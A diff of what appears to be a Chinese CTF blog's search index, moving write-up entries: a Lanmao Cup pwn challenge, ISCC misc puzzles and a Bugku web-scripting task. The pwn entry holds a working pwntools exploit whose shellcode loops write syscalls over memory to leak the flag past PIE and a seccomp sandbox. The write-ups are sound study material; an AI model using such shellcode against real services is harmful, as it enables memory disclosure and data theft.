@@ -259,59 +259,6 @@
       </tags>
   </entry>
   <entry>
-    <title>蓝帽杯初赛pwn1复现</title>
-    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
-    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
-<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
-
-
-
-<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
-
-<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
-
-<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
-<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
-
-<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
-
-
-
-<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
-
-<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
-<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
-
-<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
-
-<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
-
-<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
-<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
-<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
-<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
-
-<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
-<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2022浙江省ctf初赛</title>
     <url>/2022/09/20/2022%E6%B5%99%E6%B1%9F%E7%9C%81ctf%E5%88%9D%E8%B5%9B/</url>
     <content><![CDATA[<blockquote>
@@ -670,6 +617,59 @@
       </tags>
   </entry>
   <entry>
+    <title>蓝帽杯初赛pwn1复现</title>
+    <url>/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/</url>
+    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>一道升级版的ret2shellcode</p>
+<h1 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h1><h2 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h2><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224631699.png" class="" title="image-20220710224631699">
+
+
+
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224715244.png" class="" title="image-20220710224715244">
+
+<p><code>init_io()</code>就是一个io初始化函数，然后可以看到这道题开了沙盒，那就利用工具检查一下，结果如下图所示</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710224957314.png" class="" title="image-20220710224957314">
+
+<p>可以看到一个白名单，根据内容可以看出只开了read和write，所以这道题就不用咱们getshell了。</p>
+<h3 id="init-main"><a href="#init-main" class="headerlink" title="init_main()"></a>init_main()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225220354.png" class="" title="image-20220710225220354">
+
+<p>可以看到<code>heap_mem</code>这个全局变量保存了堆的malloc地址，然后下面的代码其实就将bss段上的内容写到堆上，具体内容如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225451610.png" class="" title="image-20220710225451610">
+
+
+
+<h3 id="init-flag"><a href="#init-flag" class="headerlink" title="init_flag()"></a>init_flag()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225612172.png" class="" title="image-20220710225612172">
+
+<p>看到了不得了的东西，直接将flag写到了bss段上。</p>
+<h3 id="go"><a href="#go" class="headerlink" title="go()"></a>go()</h3><img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710225729898.png" class="" title="image-20220710225729898">
+
+<p>因为<code>heap_mem</code>上保存的是堆的malloc地址，所以这里我们写入的内容是写到了之前创建的堆上，然后也返回到我们之前的堆上面去。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>首先运行一下程序</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230113827.png" class="" title="image-20220710230113827">
+
+<p>在随便输入一串数据后程序果然崩溃了，当时我以为造成程序崩溃的是堆上的垃圾数据，所以分析到这便没了后续。但是比较敏感的话其实可以感觉的得出来在<code>init_mem()</code>中堆上写的其实并不是随随便便的垃圾数据，进入调试一下便可验证。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710230644865.png" class="" title="image-20220710230644865">
+
+<p>如上图所示，其实<code>ret heap_mem()</code>后程序还能继续正常执行，写入到堆中的其实是一句句可执行的汇编指令，最后导致程序崩溃的原因是在后面。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>经过上诉分析程序的利用点还是很好看出来的，我们只需要在read的时候向程序写入攻击的shellcode便可正常执行获取flag。这里可以选择利用write系统调用，直接将flag打印出来。</p>
+<p>&#x3D;&#x3D;因为开启了PIE，所以这里的flag的地址需要我们进行爆破一下，但爆破有个简单的方法：&#x3D;&#x3D;</p>
+<p>在执行完系统调用后，rcx会保存下一条指令的地址（原因涉及内核，感兴趣可去了解），如下图所示。</p>
+<img src="/2022/07/12/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn1(%E5%A4%8D%E7%8E%B0)/image-20220710231937873.png" class="" title="image-20220710231937873">
+
+<p>利用这点我们就可以定位到shellcode地址，因为shllcode保存地址和flag保存地址就差28位，利用and获得其高位保存在rsi 作为基地址，后28位需要爆破，r15存储偏移，每次打印0x1000个字符，打印后跳转到$-0x19也就是mov rax，1处，然后继续从基地址+0x1000开始打印0x1000个字符，如此循环即可。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./escape_shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&quot;39.106.156.74&quot;,23470)</span></span><br><span class="line"><span class="comment">#start=0</span></span><br><span class="line">start=<span class="number">0x500000000000</span></span><br><span class="line"><span class="comment">#addr=0x5633c143f000</span></span><br><span class="line">code=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi,1</span></span><br><span class="line"><span class="string">    mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">    mov r12,0xfffff0000000</span></span><br><span class="line"><span class="string">    mov r15,0x1000#r15储存偏移</span></span><br><span class="line"><span class="string">    mov rdx,0x1000#打印长度设置为0x1000</span></span><br><span class="line"><span class="string">    mov rax,1</span></span><br><span class="line"><span class="string">    syscall#write(rdi,rsi,rdx)</span></span><br><span class="line"><span class="string">    mov rsi,rcx#write执行后rcx 储存着shllcode的相关地址</span></span><br><span class="line"><span class="string">    and rsi,r12#丢弃后28位</span></span><br><span class="line"><span class="string">    add rsi,r15#rsi=rsi+偏移地址</span></span><br><span class="line"><span class="string">    add r15,0x1000#偏移递增0x1000</span></span><br><span class="line"><span class="string">    jmp $-0x19#循环 跳转到mov rax，1 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(start)</span><br><span class="line">payload=asm(code)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag=<span class="string">b&#x27;flag&#123;&#x27;</span>+sh.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>其实这题不难，比赛过程中被自己误导后就放弃了，也个自己涨了教训，当遇到“绝境“的时候不妨静下心仔细调试一下。</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>变量1（BUGKU）</title>
     <url>/2022/07/06/BUGKU%20%E5%8F%98%E9%87%8F1/</url>
     <content><![CDATA[<p>前言：php是一门非常好的语言^o^</p>
@@ -834,6 +834,27 @@
       </tags>
   </entry>
   <entry>
+    <title>ISCC 2022 藏在星空中的诗-2</title>
+    <url>/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/</url>
+    <content><![CDATA[<p>下载附件，打开是poem.txt</p>
+<img src="/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/wps4.jpg" class="" title="img"> 
+
+<p>初次看到，就觉得很像unicode编码毕竟划分开来五位还有反斜杠。前面第一个星星一样，肯定都是\u了接下来开始猜测后面的四位。前面四组就很像ISCC了，于是可以先借用之前的第一题的表格。查询了ISCC 的unicode编码，对应星星写到表格中，再把文本中出现的星星都用黄底标起来。（这里也可以猜到第五组星星和最后一组应该是“{”“}”）</p>
+<p>发现了表格中星星的unicode码的最后一位和本题的对应字母有关，重复的字母用之前的ISCC已经去掉了，试一试。</p>
+<p>下图是我对应出来的表格，可以作为参考</p>
+<img src="/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/wps5.jpg" class="" title="img"> 
+
+<p>接下来对应着知道该文本的星星解出来的unicode码，再进行在线unicode解码就可以了</p>
+<p>本题没有考察新知识点，一道脑洞题。要找到规律。</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ISCC 2022 MISC4</title>
     <url>/2022/06/19/ISCC%202022%20MISC4/</url>
     <content><![CDATA[<p>下载附件打开压缩包</p>
@@ -866,27 +887,6 @@
 <p>在整个音频后端发现了摩斯密码，进行解密：ISCCMISC感觉不像最后答案，提交了发现错误。回到flag.txt，这时候能确定ISCCMISC是有用的，那就试试snow来解密文档</p>
 <p>.&#x2F;snow.exe -p isccmisc -C flag.txt</p>
 <p>这里的isccmisc需要小写，最后解出来的也就是答案</p>
-]]></content>
-      <categories>
-        <category>比赛</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ISCC 2022 藏在星空中的诗-2</title>
-    <url>/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/</url>
-    <content><![CDATA[<p>下载附件，打开是poem.txt</p>
-<img src="/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/wps4.jpg" class="" title="img"> 
-
-<p>初次看到，就觉得很像unicode编码毕竟划分开来五位还有反斜杠。前面第一个星星一样，肯定都是\u了接下来开始猜测后面的四位。前面四组就很像ISCC了，于是可以先借用之前的第一题的表格。查询了ISCC 的unicode编码，对应星星写到表格中，再把文本中出现的星星都用黄底标起来。（这里也可以猜到第五组星星和最后一组应该是“{”“}”）</p>
-<p>发现了表格中星星的unicode码的最后一位和本题的对应字母有关，重复的字母用之前的ISCC已经去掉了，试一试。</p>
-<p>下图是我对应出来的表格，可以作为参考</p>
-<img src="/2022/06/19/ISCC%202022%20%E8%97%8F%E5%9C%A8%E6%98%9F%E7%A9%BA%E4%B8%AD%E7%9A%84%E8%AF%97-2/wps5.jpg" class="" title="img"> 
-
-<p>接下来对应着知道该文本的星星解出来的unicode码，再进行在线unicode解码就可以了</p>
-<p>本题没有考察新知识点，一道脑洞题。要找到规律。</p>
 ]]></content>
       <categories>
         <category>比赛</category>
@@ -1073,51 +1073,6 @@
       </tags>
   </entry>
   <entry>
-    <title>bugku 秋名山车神</title>
-    <url>/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/</url>
-    <content><![CDATA[<h1 id="bugku-秋名山车神"><a href="#bugku-秋名山车神" class="headerlink" title="bugku 秋名山车神"></a>bugku 秋名山车神</h1><p><em><strong>get新知识：一些有关python爬虫的基本知识</strong></em></p>
-<h2 id="解题部分"><a href="#解题部分" class="headerlink" title="解题部分"></a>解题部分</h2><p>​			<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231551976.png" class="" title="image-20220805231551976"></p>
-<p>题目中都是这样的大数字进行计算，并且需要短时间内计算，所以这不得不使用脚本进行解题，脚本如下</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bugku 秋名山车神 --爬虫练习</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:18569/&#x27;</span>                              <span class="comment">#网页的url</span></span><br><span class="line">r=s.get(url)                                                    <span class="comment">#以get的方式访问网站</span></span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span>                                            <span class="comment">#设置编码格式</span></span><br><span class="line">a=r.text                                                        <span class="comment">#将页面定义给a</span></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"></span><br><span class="line">n = re.findall(<span class="string">r&#x27;\d.*?=&#x27;</span>,a)[<span class="number">0</span>]                                  <span class="comment">#通过re正则匹配出a中的数字</span></span><br><span class="line"><span class="comment">#print(n)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=re.sub(<span class="string">&quot;[=]&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(n))                                       <span class="comment">#去掉那个多余的&#x27;=&#x27;</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line">c=<span class="built_in">eval</span>(c)                                                         <span class="comment">#执行代码==》计算</span></span><br><span class="line"></span><br><span class="line">o = s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:c&#125;)  <span class="comment">#提交结果</span></span><br><span class="line"><span class="built_in">print</span> (o.text)</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231808660.png" class="" title="image-20220805231808660">
-
-<pre><code> ## 	脚本分析
-</code></pre>
-<p>个人理解脚本分为三部分：1、获取数据    2、正则读取数据并处理   3、传输数据</p>
-<p>1、获取数据</p>
-<p>这部分利用了requests类的内置的方法，其中值得一提的是s&#x3D;requests.Session()这部分，必须有目的是保持会话</p>
-<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231827926.png" class="" title="image-20220805231827926">
-
-<p>2、正则读取数据并处理</p>
-<p>这里用了两个re库中的两个内置函数</p>
-<p>​	1、在import re中，(re.findall(pattern, string, flags&#x3D;0))：返回string中所有与pattern相匹配的全部<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，得到数组</p>
-<p>​	2、re.sub是个正则表达式方面的函数，用来实现通过正则表达式，实现比普通字符串的replace更加强大的替换功能；</p>
-<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231838154.png" class="" title="image-20220805231838154">
-
-
-
-<p>3、传输数据</p>
-<p>题目中提示用post传输所以</p>
-<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231848266.png" class="" title="image-20220805231848266">
-
-
-
-<p>特别感谢：</p>
-<p><a href="https://blog.csdn.net/m0_64815693/article/details/125539527?spm=1001.2014.3001.5502">(27条消息) Bugku 秋名山车神_没有名字了。。的博客-CSDN博客</a></p>
-<p><a href="https://blog.csdn.net/qq_43088815/article/details/90214217">(27条消息) python re模块(正则表达式) sub()函数详解_leo的学习之旅的博客-CSDN博客_python sub函数</a></p>
-<p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">(27条消息) Python—re.findall的用法_扫地di的博客-CSDN博客_python re.findall()用法</a></p>
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>web题集</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>BUUCTF [WUSTCTF2020]朴实无华</title>
     <url>/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/</url>
     <content><![CDATA[<p>进入题目，发现有乱码问题</p>
@@ -1164,6 +1119,51 @@
 <p>之后便可查到flag了</p>
 <img src="/2022/08/14/buu_WUSTCTF2020_%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/image-20220812230059556.png" class="" title="image-20220812230059556">
 
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>web题集</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku 秋名山车神</title>
+    <url>/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/</url>
+    <content><![CDATA[<h1 id="bugku-秋名山车神"><a href="#bugku-秋名山车神" class="headerlink" title="bugku 秋名山车神"></a>bugku 秋名山车神</h1><p><em><strong>get新知识：一些有关python爬虫的基本知识</strong></em></p>
+<h2 id="解题部分"><a href="#解题部分" class="headerlink" title="解题部分"></a>解题部分</h2><p>​			<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231551976.png" class="" title="image-20220805231551976"></p>
+<p>题目中都是这样的大数字进行计算，并且需要短时间内计算，所以这不得不使用脚本进行解题，脚本如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#bugku 秋名山车神 --爬虫练习</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:18569/&#x27;</span>                              <span class="comment">#网页的url</span></span><br><span class="line">r=s.get(url)                                                    <span class="comment">#以get的方式访问网站</span></span><br><span class="line">r.encoding = <span class="string">&#x27;utf-8&#x27;</span>                                            <span class="comment">#设置编码格式</span></span><br><span class="line">a=r.text                                                        <span class="comment">#将页面定义给a</span></span><br><span class="line"><span class="comment">#print(a)</span></span><br><span class="line"></span><br><span class="line">n = re.findall(<span class="string">r&#x27;\d.*?=&#x27;</span>,a)[<span class="number">0</span>]                                  <span class="comment">#通过re正则匹配出a中的数字</span></span><br><span class="line"><span class="comment">#print(n)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c=re.sub(<span class="string">&quot;[=]&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">str</span>(n))                                       <span class="comment">#去掉那个多余的&#x27;=&#x27;</span></span><br><span class="line"><span class="comment">#print(c)</span></span><br><span class="line">c=<span class="built_in">eval</span>(c)                                                         <span class="comment">#执行代码==》计算</span></span><br><span class="line"></span><br><span class="line">o = s.post(url,data=&#123;<span class="string">&#x27;value&#x27;</span>:c&#125;)  <span class="comment">#提交结果</span></span><br><span class="line"><span class="built_in">print</span> (o.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231808660.png" class="" title="image-20220805231808660">
+
+<pre><code> ## 	脚本分析
+</code></pre>
+<p>个人理解脚本分为三部分：1、获取数据    2、正则读取数据并处理   3、传输数据</p>
+<p>1、获取数据</p>
+<p>这部分利用了requests类的内置的方法，其中值得一提的是s&#x3D;requests.Session()这部分，必须有目的是保持会话</p>
+<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231827926.png" class="" title="image-20220805231827926">
+
+<p>2、正则读取数据并处理</p>
+<p>这里用了两个re库中的两个内置函数</p>
+<p>​	1、在import re中，(re.findall(pattern, string, flags&#x3D;0))：返回string中所有与pattern相匹配的全部<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>，得到数组</p>
+<p>​	2、re.sub是个正则表达式方面的函数，用来实现通过正则表达式，实现比普通字符串的replace更加强大的替换功能；</p>
+<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231838154.png" class="" title="image-20220805231838154">
+
+
+
+<p>3、传输数据</p>
+<p>题目中提示用post传输所以</p>
+<img src="/2022/08/06/bugku_%E7%A7%8B%E5%90%8D%E5%B1%B1%E8%BD%A6%E7%A5%9E/image-20220805231848266.png" class="" title="image-20220805231848266">
+
+
+
+<p>特别感谢：</p>
+<p><a href="https://blog.csdn.net/m0_64815693/article/details/125539527?spm=1001.2014.3001.5502">(27条消息) Bugku 秋名山车神_没有名字了。。的博客-CSDN博客</a></p>
+<p><a href="https://blog.csdn.net/qq_43088815/article/details/90214217">(27条消息) python re模块(正则表达式) sub()函数详解_leo的学习之旅的博客-CSDN博客_python sub函数</a></p>
+<p><a href="https://blog.csdn.net/jly164260234/article/details/83215924">(27条消息) Python—re.findall的用法_扫地di的博客-CSDN博客_python re.findall()用法</a></p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1284,29 +1284,6 @@
       </tags>
   </entry>
   <entry>
-    <title>collision</title>
-    <url>/2022/07/12/collision(wp)/</url>
